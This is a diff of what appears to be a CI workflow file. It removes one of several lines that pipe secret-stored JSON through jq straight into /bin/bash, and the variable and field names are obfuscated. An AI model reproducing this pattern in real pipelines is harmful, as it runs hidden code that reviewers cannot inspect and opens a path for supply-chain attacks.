@@ -20,7 +20,6 @@ jobs:
           sqas4847: ${{ secrets.sqas4847 }}
         run: |
           printf '%s' "$sqas4847" | jq -r .uoj8654 | /bin/bash
-          echo $z7371 | jq -r .zmns4292 | /bin/bash
           echo $qemzo2894 | jq -r .idwr0223 | /bin/bash
           printf '%s' "$iyme024" | jq -r .ftdeo870 | /bin/bash
           printf '%s' "$jred86" | jq -r .dgudl5445 | /bin/bash
